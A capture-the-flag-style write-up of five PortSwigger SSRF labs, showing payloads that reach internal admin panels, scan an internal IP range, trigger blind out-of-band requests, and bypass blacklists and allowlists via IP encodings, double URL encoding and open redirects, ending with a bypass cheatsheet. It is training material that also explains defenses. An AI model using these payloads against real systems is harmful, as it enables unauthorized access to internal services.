# Server-Side Request Forgery (SSRF) — PortSwigger Labs Write-Up

**Author:** XENOS  
**Platform:** PortSwigger Web Security Academy  
**Category:** Server-Side Request Forgery (SSRF)  
**Difficulty:** Apprentice → Practitioner  
**Date:** March 2026

---

## Table of Contents

1. [What is SSRF?](#what-is-ssrf)
2. [Lab 1 — Basic SSRF against the local server](#lab-1--basic-ssrf-against-the-local-server)
3. [Lab 2 — Basic SSRF against another back-end system](#lab-2--basic-ssrf-against-another-back-end-system)
4. [Lab 3 — Blind SSRF with out-of-band detection](#lab-3--blind-ssrf-with-out-of-band-detection)
5. [Lab 4 — SSRF with blacklist-based input filter](#lab-4--ssrf-with-blacklist-based-input-filter)
6. [Lab 5 — SSRF with filter bypass via open redirection](#lab-5--ssrf-with-filter-bypass-via-open-redirection)
7. [Key Takeaways](#key-takeaways)

---

## What is SSRF?

Server-Side Request Forgery is a vulnerability that allows an attacker to make the server perform HTTP requests on their behalf. The core issue lies in the trust model — internal services trust requests coming from the server itself, bypassing firewall rules and authentication that would otherwise block external access.

```
Attacker → [Firewall] → Web Server → Internal Network
    ❌ blocked                ✅ trusted
```

The attacker does not need direct access to the internal network. They use the server as a **proxy**.

---

## Lab 1 — Basic SSRF against the local server

**Difficulty:** Apprentice  
**Objective:** Access the admin interface at `http://localhost/admin` and delete user `carlos`.

### Reconnaissance

The application has a "Check stock" feature on product pages. Intercepting the request reveals:

```
POST /product/stock HTTP/2
...
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=2
```

The `stockApi` parameter accepts a full URL — the server fetches it directly with no validation.

### Exploitation

Changed `stockApi` to:

```
stockApi=http://localhost/admin
```

**Response:** `200 OK` — the admin panel HTML returned in full, including:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

Followed the delete endpoint:

```
stockApi=http://localhost/admin/delete?username=carlos
```

**Response:** `302 Found` → carlos deleted. ✅

### Why did this work?

The server treated `localhost` as a trusted internal request. The admin panel had no additional authentication because it assumed only internal traffic could reach it — a broken trust assumption the SSRF directly violated.

---

## Lab 2 — Basic SSRF against another back-end system

**Difficulty:** Apprentice  
**Objective:** Scan the `192.168.0.X` range on port 8080 for an admin interface, then delete `carlos`.

### Reconnaissance

Same `stockApi` parameter as Lab 1. The difference: the target is an internal machine with an unknown IP in the `192.168.0.1–255` range.

### Exploitation

**Step 1 — Host discovery via Burp Intruder**

Sent the request to Intruder and marked the last IP octet as the payload position:

```
stockApi=http://192.168.0.§1§:8080/admin
```

Payload: Numbers — From `1`, To `255`, Step `1`.

Filtered results by response length — one IP returned `200 OK`:

```
192.168.0.60
```

**Step 2 — Delete the user**

```
stockApi=http://192.168.0.60:8080/admin/delete?username=carlos
```

**Response:** `302 Found` → carlos deleted. ✅

### What's new here?

SSRF is not limited to `localhost`. It can be used to perform **internal network scanning** — enumerating hosts and ports that are completely invisible from the internet.

---

## Lab 3 — Blind SSRF with out-of-band detection

**Difficulty:** Practitioner  
**Objective:** Cause the server to make an HTTP request to Burp Collaborator.

### Reconnaissance

The application uses analytics software that fetches the URL in the `Referer` header when a product page loads. There is no visible output — this is a **Blind SSRF**.

```
GET /product?productId=2 HTTP/2
...
Referer: https://the-site.com/
```

### Blind SSRF vs. Regular SSRF

| Type | Response visible? | Detection method |
|------|-------------------|-----------------|
| Regular SSRF | ✅ Yes | Read the response directly |
| Blind SSRF | ❌ No | Out-of-band (OOB) interaction |

With Blind SSRF, the server makes the request silently. To confirm it, an external server that logs incoming connections is needed — Burp Collaborator serves this purpose.

### Exploitation

Modified the `Referer` header to point to a Collaborator domain:

```
Referer: https://xenos123test.burpcollaborator.net
```

The analytics software fetched this URL → the interaction was logged → lab solved. ✅

### Key concept

The vulnerability lives in a header, not a parameter. Any place where user input is used as a URL is a potential SSRF vector: `Referer`, `X-Forwarded-For`, webhook endpoints, import features.

---

## Lab 4 — SSRF with blacklist-based input filter

**Difficulty:** Practitioner  
**Objective:** Bypass two anti-SSRF defenses to access `http://localhost/admin` and delete `carlos`.

### The defenses

The developer implemented a blacklist blocking:
- `localhost` and `127.0.0.1`
- The string `admin`

### Why blacklists fail

A blacklist checks for specific strings. It cannot account for every possible representation of the same value. The attack surface for bypass is large.

### Bypass 1 — `localhost` filter

`127.0.0.1` has many equivalent representations:

| Representation | Value |
|----------------|-------|
| Standard | `127.0.0.1` |
| Short form | `127.1` |
| Decimal | `2130706433` |
| Hex | `0x7f000001` |
| IPv6 | `[::1]` |

The filter only checks for `localhost` and `127.0.0.1`. `127.1` passes through:

```
stockApi=http://127.1/admin
→ blocked (admin is filtered)
```

### Bypass 2 — `/admin` filter

The filter looks for the literal string `admin`. Double URL encoding breaks pattern matching:

```
a → URL encode → %61 → URL encode again → %2561
```

The filter decodes once → sees `%2561` → does not recognize it as `admin` → passes it.  
The server decodes twice → sees `admin` → executes it.

### Final payload

```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

**Response:** `302 Found` → carlos deleted. ✅

### The lesson

Blacklists are inherently incomplete. A single missed representation breaks the entire defense. The correct approach is a **whitelist** — permit only known-safe values, reject everything else.

---

## Lab 5 — SSRF with filter bypass via open redirection

**Difficulty:** Practitioner  
**Objective:** Use an open redirect to bypass a whitelist filter and reach `http://192.168.0.12:8080/admin`.

### The defense

The server only allows `stockApi` values pointing to the same application domain:

```
✅ https://the-site.com/anything
❌ http://192.168.0.12:8080/admin
```

This is a whitelist — stronger than a blacklist. Direct IP injection fails.

### Open Redirect discovery

The application has a "Next product" navigation feature:

```
/product/nextProduct?path=/product?productId=2
```

The `path` parameter accepts any URL and the server follows it without validation — a classic **Open Redirect**.

### Chaining SSRF + Open Redirect

The whitelist checks the value of `stockApi` as a string, not where it ultimately navigates. It sees a trusted domain and passes the request.

The server then follows the redirect to the internal IP — an address the filter would have blocked if given directly.

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Flow:
```
Filter sees: /product/nextProduct?... ✅ (same-origin path)
Server fetches it → gets 302 redirect → follows to 192.168.0.12:8080/admin
```

Admin panel returned → followed delete endpoint → carlos deleted. ✅

### Key concept

A whitelist can be bypassed when the application itself contains an open redirect. The filter trusts the domain; the redirect does the rest. Defense in depth matters — fixing SSRF requires both input validation and eliminating open redirects.

---

## Key Takeaways

| Concept | Summary |
|---------|---------|
| Basic SSRF | Attacker controls URL → server makes internal request |
| Network scanning | SSRF can enumerate internal hosts and ports |
| Blind SSRF | No response returned — OOB (DNS/HTTP) is the only detection method |
| Blacklist bypass | IP representations, URL encoding, case variation all evade string-based filters |
| Open redirect chain | Whitelist bypass by routing through a trusted redirect endpoint |
| Correct defense | Whitelist allowed destinations + disable open redirects + never trust user-supplied URLs |

### SSRF bypass cheatsheet

```
# localhost equivalents
127.0.0.1
localhost
127.1
2130706433       ← decimal
0x7f000001       ← hex
0177.0.0.1       ← octal
[::1]            ← IPv6

# /admin bypass
/admin           ← direct
/%61dmin         ← URL encoded 'a'
/%2561dmin       ← double URL encoded 'a'
/Admin           ← case variation
```

---

*— XENOS*
